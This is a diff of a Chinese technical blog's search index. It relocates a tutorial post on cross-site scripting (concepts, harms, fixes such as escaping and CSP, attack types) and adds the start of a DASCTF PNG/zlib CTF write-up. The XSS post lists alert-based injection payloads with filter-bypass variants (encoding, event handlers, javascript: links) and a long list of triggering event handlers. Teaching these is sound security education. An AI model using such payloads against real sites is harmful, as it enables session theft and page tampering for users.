@@ -138,6 +138,134 @@
       </tags>
   </entry>
   <entry>
+    <title>XSS注入</title>
+    <url>//post/CrossSiteScripting/</url>
+    <content><![CDATA[<h3 id="XSS注入漏洞概念">XSS注入漏洞概念</h3>
+<p>跨站脚本（Cross-Site Scripting，XSS）是一种常见的网络安全漏洞，它允许攻击者将恶意脚本注入到网页中，从而在用户的浏览器上执行。XSS漏洞通常发生在Web应用程序中，当应用程序未正确验证和过滤用户输入时，攻击者可以利用这个漏洞来注入恶意脚本。这可能导致用户受到欺骗、信息泄露、会话劫持等问题。</p>
+<h3 id="XSS注入漏洞危害">XSS注入漏洞危害</h3>
+<ul>
+<li><strong>未授权用户/普通用户窃取Cookie：</strong> 攻击者可以通过在受影响的网页中注入恶意脚本，将用户的Cookie信息发送到攻击者的服务器。一旦攻击者获取了用户的Cookie，他们可以通过模拟用户的身份进行未经授权的操作，可能导致敏感数据泄露或者越权访问。</li>
+<li><strong>页面篡改-挂载恶意广告：</strong> 攻击者可以通过XSS注入脚本来修改页面内容，例如在网站上插入恶意广告、弹窗或者其他欺诈性内容。这可能损害网站的声誉，影响用户体验，甚至导致用户受骗。</li>
+<li><strong>页面篡改-跳转至别的网站：</strong> 攻击者还可以利用XSS漏洞将用户重定向到其他恶意网站，这可能包括涉及黄色内容、赌博、毒品等不法行为的网站。这不仅危害用户，还可能导致法律责任问题。</li>
+</ul>
+<h3 id="XSS注入漏洞修复">XSS注入漏洞修复</h3>
+<ul>
+<li><strong>XSS全局过滤器（输入验证）：</strong> 在Web应用程序中，可以实施一个XSS全局过滤器，对请求中的所有参数进行拦截和处理。该过滤器可以检查用户输入中的潜在恶意脚本，并对其进行过滤或者编码。常见的处理方式包括删除或转义特殊字符，如单引号、双引号、小于号、大于号等。使用现有的安全库（例如ESAPI）来处理XSS过滤是一种良好的实践，因为这样可以确保过滤器的实现是经过充分测试和验证的。</li>
+<li><strong>HtmlUtils.htmlEscape(source)：</strong> 在Java中，Spring框架提供了HtmlUtils类，其中包括htmlEscape方法，用于对HTML内容进行转义。通过调用<code>HtmlUtils.htmlEscape(source)</code>方法，可以将潜在的HTML或JavaScript代码进行编码，从而防止浏览器解析执行这些代码。这是一个方便的工具，可以帮助防范XSS攻击。</li>
+<li><strong>内容安全策略（CSP）：</strong> 在HTTP响应头中设置CSP策略，限制网页可以加载的资源和执行的操作，从而减少XSS攻击的成功几率。</li>
+<li><strong>使用安全的编码库：</strong> 使用专门的编码库，如OWASP的ESAPI，确保编码和解码操作是安全可靠的。</li>
+</ul>
+<h3 id="XSS注入漏洞类型">XSS注入漏洞类型</h3>
+<p>XSS（跨站脚本）漏洞主要分为三种类型，取决于攻击者注入恶意脚本的方式和执行上下文。这三种类型是：</p>
+<ul>
+<li><strong>存储型XSS（Stored XSS）：</strong>
+<ul>
+<li><strong>概念：</strong> 存储型XSS发生在用户提交的数据被存储在服务器上，并在其他用户访问时被检索和显示的情况下。攻击者通过提交包含恶意脚本的数据，将其存储在服务器上，然后其他用户在访问相应页面时执行了这些脚本。</li>
+</ul>
+</li>
+<li><strong>反射型XSS（Reflected XSS）：</strong>
+<ul>
+<li><strong>概念：</strong> 反射型XSS发生在用户提交的数据被直接返回到页面，并在该页面上执行的情况下。攻击者通过构造包含恶意脚本的URL，诱使用户点击该URL，而服务器在响应中反射（显示）了恶意脚本。</li>
+</ul>
+</li>
+<li><strong>DOM型XSS（DOM-based XSS）：</strong>
+<ul>
+<li><strong>概念：</strong> DOM型XSS发生在页面中存在可被JavaScript动态修改的DOM元素，并且恶意脚本通过修改DOM来执行的情况下。攻击者构造的URL或提交的数据，由JavaScript解析后修改了DOM，导致了脚本的执行。</li>
+</ul>
+</li>
+</ul>
+<h3 id="XSS注入漏洞攻击">XSS注入漏洞攻击</h3>
+<p>XSS（跨站脚本）注入是一种常见的Web安全漏洞，攻击者通过在网站中注入恶意脚本，使得用户在浏览网页时执行这些恶意脚本。攻击者通常通过利用用户输入未经过滤的漏洞，将恶意代码嵌入到网页中。以下是XSS攻击的一般步骤和攻击者可能采用的方法：</p>
+<h4 id="攻击步骤：">攻击步骤：</h4>
+<ol>
+<li><strong>寻找漏洞：</strong> 攻击者通过扫描目标网站或应用程序，寻找未经过滤的用户输入点，例如表单、URL参数、Cookie等。</li>
+<li><strong>构造恶意输入：</strong> 一旦找到漏洞，攻击者构造包含恶意脚本的输入，这可以是JavaScript代码，如弹窗、重定向或者窃取Cookie的脚本。</li>
+<li><strong>提交或传递恶意输入：</strong> 攻击者将构造的恶意输入提交到目标网站或通过URL参数传递给目标页面。</li>
+<li><strong>服务器端未正确处理：</strong> 如果服务器端未正确处理用户输入，将恶意脚本嵌入到网页中，存储在数据库中（存储型XSS）或者直接反射到响应中（反射型XSS）。</li>
+<li><strong>受害者浏览器执行脚本：</strong> 当用户访问包含恶意脚本的页面时，浏览器会执行这些脚本，从而使攻击者能够在用户上下文中执行各种操作。</li>
+</ol>
+<h4 id="攻击者可能采用的方法：">攻击者可能采用的方法：</h4>
+<ol>
+<li>
+<p><strong>通过表单注入：</strong> 在网站的搜索框、评论框等用户可输入的地方注入恶意脚本，使其被储存或反射到其他用户的浏览器中。</p>
+</li>
+<li>
+<p><strong>通过URL参数注入：</strong> 修改URL中的参数，将恶意脚本传递给目标页面，利用服务器端未对输入进行正确处理的漏洞。URL参数注入是一种XSS攻击的常见手法，攻击者通过修改URL中的参数来注入恶意脚本，从而使得这些脚本被执行。以下是一些攻击者可能使用的方法：</p>
+<ul>
+<li>
+<p><strong>基本的脚本注入：</strong></p>
+<p>攻击者可能尝试通过在URL参数中添加JavaScript代码来注入脚本。例如：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/page?param=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>闭合标签：</strong></p>
+<p>如果目标页面未正确过滤输入，攻击者可以尝试通过闭合已存在的HTML标签来注入脚本。例如：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/page?param=&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>使用特殊字符：</strong></p>
+<p>攻击者可能尝试使用特殊字符，如单引号、双引号、尖括号等，来绕过输入过滤。例如：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/page?param=&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(&quot;XSS&quot;)&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>嵌套注入：</strong></p>
+<p>攻击者可能尝试嵌套多个标签以混淆输入过滤。例如：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">http://example.com/page?param=&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(&quot;XSS&quot;)&#x27;&gt;</span><br><span class="line">                          &lt;img src=&#x27;y&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>使用编码：</strong></p>
+<p>攻击者可能尝试使用URL编码、十六进制编码、html实体编码等方式，以绕过输入过滤。例如：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/page?param=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>尝试事件处理器：</strong></p>
+<p>攻击者可能尝试使用各种JavaScript事件处理器，如<code>onmouseover</code>、<code>onfocus</code>等来触发脚本执行。例如：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/page?param=&lt;img src=&#x27;x&#x27; onmouseover=&#x27;alert(&quot;XSS&quot;)&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>伪协议：</strong></p>
+<p>伪协议是用于在超文本环境中触发特定行为的特殊 URI 方案。可用于执行JavaScript代码，例如：</p>
+</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;Hello, this is a JavaScript execution!&#x27;);&quot;</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><strong>通过Cookie注入：</strong> 如果网站使用未经过滤的Cookie数据，攻击者可能通过修改Cookie中的值来注入恶意脚本。</p>
+</li>
+<li>
+<p><strong>社会工程学攻击：</strong> 攻击者可能通过欺骗用户点击包含恶意脚本的链接，从而触发XSS攻击。</p>
+</li>
+</ol>
+<h3 id="XSS靶场题解：">XSS靶场题解：</h3>
+<p><a class="link"   href="https://zch050217.github.io/2024/02/04/XSS%E9%9D%B6%E5%9C%BA/" >XSS靶场题解 | C3ngH’s B10g<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="附加知识">附加知识</h3>
+<ul>
+<li>
+<h4 id="触发事件函数">触发事件函数</h4>
+</li>
+</ul>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件) </span><br><span class="line"></span><br><span class="line">2. onAbort() (当用户中止加载图片时) </span><br><span class="line"></span><br><span class="line">3. onActivate() (当对象激活时) </span><br><span class="line"></span><br><span class="line">4. onAfterPrint() (用户打印或进行打印预览后触发) </span><br><span class="line"></span><br><span class="line">5. onAfterUpdate() (从数据源对象更新数据后由数据对象触发) </span><br><span class="line"></span><br><span class="line">6. onBeforeActivate() (在对象设置为激活元素前触发) </span><br><span class="line"></span><br><span class="line">7. onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过执行execCommand(&quot;Copy&quot;)函数触发) </span><br><span class="line"></span><br><span class="line">8. onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码) </span><br><span class="line"></span><br><span class="line">9. onBeforeDeactivate() (在当前对象的激活元素变化前触发) </span><br><span class="line"></span><br><span class="line">10. onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的对象被选中时触发) </span><br><span class="line"></span><br><span class="line">11. onBeforePaste() (在用户被诱导进行粘贴前或使用execCommand(&quot;Paste&quot;)函数触发) </span><br><span class="line"></span><br><span class="line">12. onBeforePrint() (用户需要被诱导进行打印或攻击者可以使用print()或execCommand(&quot;Print&quot;)函数). </span><br><span class="line"></span><br><span class="line">13. onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能关闭当前窗口) </span><br><span class="line"></span><br><span class="line">14. onBeforeUpdate() (从数据源对象更新数据前由数据对象触发) </span><br><span class="line"></span><br><span class="line">15. onBegin() (当元素周期开始时由onbegin 事件立即触发) </span><br><span class="line"></span><br><span class="line">16. onBlur() (另一个窗口弹出当前窗口失去焦点时触发) </span><br><span class="line"></span><br><span class="line">17. onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内容到达窗口一边时触发) </span><br><span class="line"></span><br><span class="line">18. onCellChange() (当数据提供者的数据变化时触发) </span><br><span class="line"></span><br><span class="line">19. onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发) </span><br><span class="line"></span><br><span class="line">20. onClick() (表单中点击触发) </span><br><span class="line"></span><br><span class="line">21. onContextMenu() (用户需要在攻击区域点击右键) </span><br><span class="line"></span><br><span class="line">22. onControlSelect() (当用户在一个对象上创建控件选中区时触发) </span><br><span class="line"></span><br><span class="line">23. onCopy() (用户需要复制一些东西或使用execCommand(&quot;Copy&quot;)命令时触发) </span><br><span class="line"></span><br><span class="line">24. onCut() (用户需要剪切一些东西或使用execCommand(&quot;Cut&quot;)命令时触发) </span><br><span class="line"></span><br><span class="line">25. onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能) </span><br><span class="line"></span><br><span class="line">26. onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发) </span><br><span class="line"></span><br><span class="line">27. onDataSetComplete() (数据源对象中所有数据可用时触发) </span><br><span class="line"></span><br><span class="line">28. onDblClick() (用户双击一个表单元素或链接) </span><br><span class="line"></span><br><span class="line">29. onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发) </span><br><span class="line"></span><br><span class="line">30. onDrag() (在元素正在拖动时触发) </span><br><span class="line"></span><br><span class="line">31. onDragEnd() (当用户完成元素的拖动时触发) </span><br><span class="line"></span><br><span class="line">32. onDragLeave() (用户在拖动元素离开放置目标时触发) </span><br><span class="line"></span><br><span class="line">33. onDragEnter() (用户将对象拖拽到合法拖曳目标) </span><br><span class="line"></span><br><span class="line">34. onDragOver() (用户将对象拖拽划过合法拖曳目标) </span><br><span class="line"></span><br><span class="line">35. onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口) </span><br><span class="line"></span><br><span class="line">36. onDragStart() (当用户开始拖动元素时触发) </span><br><span class="line"></span><br><span class="line">37. onDrop() (当拖动元素放置在目标区域时触发) </span><br><span class="line"></span><br><span class="line">38. onEnded() (在视频/音频（audio/video）播放结束时触发) </span><br><span class="line"></span><br><span class="line">39. onError() (在加载文档或图像时发生错误) </span><br><span class="line"></span><br><span class="line">40. onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发) </span><br><span class="line"></span><br><span class="line">41. onFilterChange() (当滤镜完成状态变更时触发) </span><br><span class="line"></span><br><span class="line">42. onFinish() (当marquee完成滚动时攻击者可以执行攻击) </span><br><span class="line"></span><br><span class="line">43. onFocus() (当窗口获得焦点时攻击者可以执行攻击代码) </span><br><span class="line"></span><br><span class="line">44. onFocusIn() (当元素将要被设置为焦点之前触发) </span><br><span class="line"></span><br><span class="line">45. onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码) </span><br><span class="line"></span><br><span class="line">46. onHashChange() (当锚部分发生变化时触发攻击代码) </span><br><span class="line"></span><br><span class="line">47. onHelp() (攻击者可以在用户在当前窗体激活时按下F1触发攻击代码) </span><br><span class="line"></span><br><span class="line">48. onInput() (在 &lt;input&gt; 或 &lt;textarea&gt; 元素的值发生改变时触发) </span><br><span class="line"></span><br><span class="line">49. onKeyDown() (用户按下一个键的时候触发) </span><br><span class="line"></span><br><span class="line">50. onKeyPress() (在键盘按键被按下并释放一个键时触发) </span><br><span class="line"></span><br><span class="line">51. onKeyUp() (用户释放一个键时触发) </span><br><span class="line"></span><br><span class="line">52. onLayoutComplete() (用户进行完打印或打印预览时触发) </span><br><span class="line"></span><br><span class="line">53. onLoad() (攻击者在窗口加载后触发攻击代码) </span><br><span class="line"></span><br><span class="line">54. onLoseCapture() (可以由releaseCapture()方法触发) </span><br><span class="line"></span><br><span class="line">55. onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发) </span><br><span class="line"></span><br><span class="line">56. onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发事件) </span><br><span class="line"></span><br><span class="line">57. onMessage() (当页面收到一个信息时触发事件) </span><br><span class="line"></span><br><span class="line">58. onMouseDown() (攻击者需要让用户点击一个图片触发事件) </span><br><span class="line"></span><br><span class="line">59. onMouseEnter() (光标移动到一个对象或区域时触发) </span><br><span class="line"></span><br><span class="line">60. onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件) </span><br><span class="line"></span><br><span class="line">61. onMouseMove() (攻击者需要让用户将光标移到一个图片或表格) </span><br><span class="line"></span><br><span class="line">62. onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件) </span><br><span class="line"></span><br><span class="line">63. onMouseOver() (光标移动到一个对象或区域) </span><br><span class="line"></span><br><span class="line">64. onMouseUp() (攻击者需要让用户点击一个图片) </span><br><span class="line"></span><br><span class="line">65. onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮) </span><br><span class="line"></span><br><span class="line">66. onMove() (用户或攻击者移动页面时触发) </span><br><span class="line"></span><br><span class="line">67. onMoveEnd() (用户或攻击者移动页面结束时触发) </span><br><span class="line"></span><br><span class="line">68. onMoveStart() (用户或攻击者开始移动页面时触发) </span><br><span class="line"></span><br><span class="line">69. onOffline() (当浏览器从在线模式切换到离线模式时触发) </span><br><span class="line"></span><br><span class="line">70. onOnline() (当浏览器从离线模式切换到在线模式时触发) </span><br><span class="line"></span><br><span class="line">71. onOutOfSync() (当元素与当前时间线失去同步时触发) </span><br><span class="line"></span><br><span class="line">72. onPaste() (用户进行粘贴时或攻击者可以使用execCommand(&quot;Paste&quot;)函数时触发) </span><br><span class="line"></span><br><span class="line">73. onPause() (在视频或音频暂停时触发) </span><br><span class="line"></span><br><span class="line">74. onPopState() (在窗口的浏览历史（history 对象）发生改变时触发) </span><br><span class="line"></span><br><span class="line">75. onProgress() (攻击者可以在一个FLASH加载时触发事件) </span><br><span class="line"></span><br><span class="line">76. onPropertyChange() (用户或攻击者需要改变元素属性时触发) </span><br><span class="line"></span><br><span class="line">77. onReadyStateChange() (每次 readyState 属性变化时被自动调用) </span><br><span class="line"></span><br><span class="line">78. onRedo() (用户返回上一页面时触发) </span><br><span class="line"></span><br><span class="line">79. onRepeat() (事件在播放完重复播放时触发) </span><br><span class="line"></span><br><span class="line">80. onReset() (用户或攻击者重置表单时触发) </span><br><span class="line"></span><br><span class="line">81. onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发:&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;) </span><br><span class="line"></span><br><span class="line">82. onResizeEnd() (用户完成改变窗体大小时触发) </span><br><span class="line"></span><br><span class="line">83. onResizeStart() (用户开始改变窗体大小时触发) </span><br><span class="line"></span><br><span class="line">84. onResume() (当元素继续播放时触发) </span><br><span class="line"></span><br><span class="line">85. onReverse() (当元素回放时触发) </span><br><span class="line"></span><br><span class="line">86. onRowsEnter() (用户或攻击者需要改变数据源中的一行) </span><br><span class="line"></span><br><span class="line">87. onRowExit() (用户或攻击者改变数据源中的一行后退出时触发) </span><br><span class="line"></span><br><span class="line">88. onRowDelete() (用户或攻击者需要删除数据源中的一行) </span><br><span class="line"></span><br><span class="line">89. onRowInserted() (user or attacker would needto insert a row in a data source) </span><br><span class="line"></span><br><span class="line">90. onScroll() (用户需要滚动或攻击者使用scrollBy()函数) </span><br><span class="line"></span><br><span class="line">91. onSeek() (当用户在元素上执行查找操作时触发) </span><br><span class="line"></span><br><span class="line">92. onSelect() (用户需要选择一些文本-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);) </span><br><span class="line"></span><br><span class="line">93. onSelectionChange() (当用户选择文本变化时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);) </span><br><span class="line"></span><br><span class="line">94. onSelectStart() (当用户开始选择文本时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);) </span><br><span class="line"></span><br><span class="line">95. onStart() (在marquee 对象开始循环时触发) </span><br><span class="line"></span><br><span class="line">96. onStop() (当用户按下停止按钮或离开页面时触发) </span><br><span class="line"></span><br><span class="line">97. onStorage() (当Web Storage更新时触发) </span><br><span class="line"></span><br><span class="line">98. onSyncRestored() (当元素与它的时间线恢复同步时触发) </span><br><span class="line"></span><br><span class="line">99. onSubmit() (需要用户或攻击者提交表单) </span><br><span class="line"></span><br><span class="line">100.onTimeError() (用户或攻击者设置时间属性出现错误时触发) </span><br><span class="line"></span><br><span class="line">101.onTrackChange() (用户或攻击者改变播放列表内歌曲时触发) </span><br><span class="line"></span><br><span class="line">102.onUndo() (用户返回上一浏览记录页面时触发) </span><br><span class="line"></span><br><span class="line">103.onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发) </span><br><span class="line"></span><br><span class="line">104.onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本) </span><br><span class="line"></span><br><span class="line">105.seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>记录自用的终端美化方案</title>
     <url>//post/BeautifyBash/</url>
     <content><![CDATA[<p><s>生产队的驴准备为自己选一个更趁手的磨盘</s>，所谓工作环境当然要赏心悦目才能更高效，下面分享一下自己在用的终端美化方案</p>
@@ -328,131 +456,232 @@
       </tags>
   </entry>
   <entry>
-    <title>XSS注入</title>
-    <url>//post/CrossSiteScripting/</url>
-    <content><![CDATA[<h3 id="XSS注入漏洞概念">XSS注入漏洞概念</h3>
-<p>跨站脚本（Cross-Site Scripting，XSS）是一种常见的网络安全漏洞，它允许攻击者将恶意脚本注入到网页中，从而在用户的浏览器上执行。XSS漏洞通常发生在Web应用程序中，当应用程序未正确验证和过滤用户输入时，攻击者可以利用这个漏洞来注入恶意脚本。这可能导致用户受到欺骗、信息泄露、会话劫持等问题。</p>
-<h3 id="XSS注入漏洞危害">XSS注入漏洞危害</h3>
+    <title>DASCTF 2024暑期挑战赛 Misc部分WP</title>
+    <url>//post/DASCTF2407/</url>
+    <content><![CDATA[<h3 id="png-master">png_master</h3>
+<p><a class="link"   href="https://zh.wikipedia.org/wiki/PNG" >PNG文件结构-维基百科<i class="fas fa-external-link-alt"></i></a></p>
 <ul>
-<li><strong>未授权用户/普通用户窃取Cookie：</strong> 攻击者可以通过在受影响的网页中注入恶意脚本，将用户的Cookie信息发送到攻击者的服务器。一旦攻击者获取了用户的Cookie，他们可以通过模拟用户的身份进行未经授权的操作，可能导致敏感数据泄露或者越权访问。</li>
-<li><strong>页面篡改-挂载恶意广告：</strong> 攻击者可以通过XSS注入脚本来修改页面内容，例如在网站上插入恶意广告、弹窗或者其他欺诈性内容。这可能损害网站的声誉，影响用户体验，甚至导致用户受骗。</li>
-<li><strong>页面篡改-跳转至别的网站：</strong> 攻击者还可以利用XSS漏洞将用户重定向到其他恶意网站，这可能包括涉及黄色内容、赌博、毒品等不法行为的网站。这不仅危害用户，还可能导致法律责任问题。</li>
+<li><code>IDAT</code>块是储存图像数据的块，在这个块中存放在图像真正的数据信息，IDAT 块只有当上一个块充满（正常length最大65524）时，才会继续一个新的块</li>
+<li>完整的图像数据由一个单独的<code>zlib datastream</code>表示，它储存在一个<code>IDAT</code>块中</li>
+<li>一个png文件中无论有多少个<code>IDAT</code>区块，在<code>IDAT</code>块中只会出现一个<code>zlib</code>块</li>
+<li><code>789C</code>在png文件中为<code>zlib</code>的标志位</li>
+<li>一个<code>zlib</code>数据块只有一个标志位，即只会出现一次<code>789C</code></li>
 </ul>
-<h3 id="XSS注入漏洞修复">XSS注入漏洞修复</h3>
-<ul>
-<li><strong>XSS全局过滤器（输入验证）：</strong> 在Web应用程序中，可以实施一个XSS全局过滤器，对请求中的所有参数进行拦截和处理。该过滤器可以检查用户输入中的潜在恶意脚本，并对其进行过滤或者编码。常见的处理方式包括删除或转义特殊字符，如单引号、双引号、小于号、大于号等。使用现有的安全库（例如ESAPI）来处理XSS过滤是一种良好的实践，因为这样可以确保过滤器的实现是经过充分测试和验证的。</li>
-<li><strong>HtmlUtils.htmlEscape(source)：</strong> 在Java中，Spring框架提供了HtmlUtils类，其中包括htmlEscape方法，用于对HTML内容进行转义。通过调用<code>HtmlUtils.htmlEscape(source)</code>方法，可以将潜在的HTML或JavaScript代码进行编码，从而防止浏览器解析执行这些代码。这是一个方便的工具，可以帮助防范XSS攻击。</li>
-<li><strong>内容安全策略（CSP）：</strong> 在HTTP响应头中设置CSP策略，限制网页可以加载的资源和执行的操作，从而减少XSS攻击的成功几率。</li>
-<li><strong>使用安全的编码库：</strong> 使用专门的编码库，如OWASP的ESAPI，确保编码和解码操作是安全可靠的。</li>
-</ul>
-<h3 id="XSS注入漏洞类型">XSS注入漏洞类型</h3>
-<p>XSS（跨站脚本）漏洞主要分为三种类型，取决于攻击者注入恶意脚本的方式和执行上下文。这三种类型是：</p>
-<ul>
-<li><strong>存储型XSS（Stored XSS）：</strong>
-<ul>
-<li><strong>概念：</strong> 存储型XSS发生在用户提交的数据被存储在服务器上，并在其他用户访问时被检索和显示的情况下。攻击者通过提交包含恶意脚本的数据，将其存储在服务器上，然后其他用户在访问相应页面时执行了这些脚本。</li>
-</ul>
-</li>
-<li><strong>反射型XSS（Reflected XSS）：</strong>
-<ul>
-<li><strong>概念：</strong> 反射型XSS发生在用户提交的数据被直接返回到页面，并在该页面上执行的情况下。攻击者通过构造包含恶意脚本的URL，诱使用户点击该URL，而服务器在响应中反射（显示）了恶意脚本。</li>
-</ul>
-</li>
-<li><strong>DOM型XSS（DOM-based XSS）：</strong>
-<ul>
-<li><strong>概念：</strong> DOM型XSS发生在页面中存在可被JavaScript动态修改的DOM元素，并且恶意脚本通过修改DOM来执行的情况下。攻击者构造的URL或提交的数据，由JavaScript解析后修改了DOM，导致了脚本的执行。</li>
-</ul>
-</li>
-</ul>
-<h3 id="XSS注入漏洞攻击">XSS注入漏洞攻击</h3>
-<p>XSS（跨站脚本）注入是一种常见的Web安全漏洞，攻击者通过在网站中注入恶意脚本，使得用户在浏览网页时执行这些恶意脚本。攻击者通常通过利用用户输入未经过滤的漏洞，将恶意代码嵌入到网页中。以下是XSS攻击的一般步骤和攻击者可能采用的方法：</p>
-<h4 id="攻击步骤：">攻击步骤：</h4>
-<ol>
-<li><strong>寻找漏洞：</strong> 攻击者通过扫描目标网站或应用程序，寻找未经过滤的用户输入点，例如表单、URL参数、Cookie等。</li>
-<li><strong>构造恶意输入：</strong> 一旦找到漏洞，攻击者构造包含恶意脚本的输入，这可以是JavaScript代码，如弹窗、重定向或者窃取Cookie的脚本。</li>
-<li><strong>提交或传递恶意输入：</strong> 攻击者将构造的恶意输入提交到目标网站或通过URL参数传递给目标页面。</li>
-<li><strong>服务器端未正确处理：</strong> 如果服务器端未正确处理用户输入，将恶意脚本嵌入到网页中，存储在数据库中（存储型XSS）或者直接反射到响应中（反射型XSS）。</li>
-<li><strong>受害者浏览器执行脚本：</strong> 当用户访问包含恶意脚本的页面时，浏览器会执行这些脚本，从而使攻击者能够在用户上下文中执行各种操作。</li>
-</ol>
-<h4 id="攻击者可能采用的方法：">攻击者可能采用的方法：</h4>
-<ol>
-<li>
-<p><strong>通过表单注入：</strong> 在网站的搜索框、评论框等用户可输入的地方注入恶意脚本，使其被储存或反射到其他用户的浏览器中。</p>
-</li>
-<li>
-<p><strong>通过URL参数注入：</strong> 修改URL中的参数，将恶意脚本传递给目标页面，利用服务器端未对输入进行正确处理的漏洞。URL参数注入是一种XSS攻击的常见手法，攻击者通过修改URL中的参数来注入恶意脚本，从而使得这些脚本被执行。以下是一些攻击者可能使用的方法：</p>
-<ul>
-<li>
-<p><strong>基本的脚本注入：</strong></p>
-<p>攻击者可能尝试通过在URL参数中添加JavaScript代码来注入脚本。例如：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/page?param=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>
-<p><strong>闭合标签：</strong></p>
-<p>如果目标页面未正确过滤输入，攻击者可以尝试通过闭合已存在的HTML标签来注入脚本。例如：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/page?param=&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>
-<p><strong>使用特殊字符：</strong></p>
-<p>攻击者可能尝试使用特殊字符，如单引号、双引号、尖括号等，来绕过输入过滤。例如：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/page?param=&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(&quot;XSS&quot;)&#x27;&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>
-<p><strong>嵌套注入：</strong></p>
-<p>攻击者可能尝试嵌套多个标签以混淆输入过滤。例如：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">http://example.com/page?param=&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(&quot;XSS&quot;)&#x27;&gt;</span><br><span class="line">                          &lt;img src=&#x27;y&#x27;&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>
-<p><strong>使用编码：</strong></p>
-<p>攻击者可能尝试使用URL编码、十六进制编码、html实体编码等方式，以绕过输入过滤。例如：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/page?param=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E</span><br></pre></td></tr></table></figure>
-<ul>
-<li>
-<p><strong>尝试事件处理器：</strong></p>
-<p>攻击者可能尝试使用各种JavaScript事件处理器，如<code>onmouseover</code>、<code>onfocus</code>等来触发脚本执行。例如：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/page?param=&lt;img src=&#x27;x&#x27; onmouseover=&#x27;alert(&quot;XSS&quot;)&#x27;&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>
-<p><strong>伪协议：</strong></p>
-<p>伪协议是用于在超文本环境中触发特定行为的特殊 URI 方案。可用于执行JavaScript代码，例如：</p>
-</li>
-</ul>
